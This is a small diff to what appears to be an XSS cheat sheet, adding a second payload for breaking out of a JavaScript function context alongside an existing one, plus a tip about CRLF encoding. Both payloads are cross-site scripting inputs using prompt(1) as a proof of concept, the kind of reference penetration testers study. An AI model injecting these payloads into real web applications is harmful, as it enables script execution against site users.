@@ -52,8 +52,11 @@ You may need to reconstruct the function
 ```html
 "};prompt(1);function whatever(){//
 ```
-
-Don't forget %0D%0A if you need a new line
+Sometimes you can't reconstruct but you can make the Javascript right
+```
+"},function(data){});prompt(1);(//
+```
+Don't forget %0D%0A if you need a new line and it renders as a new line
 
 Obscure Breakout
 ==============
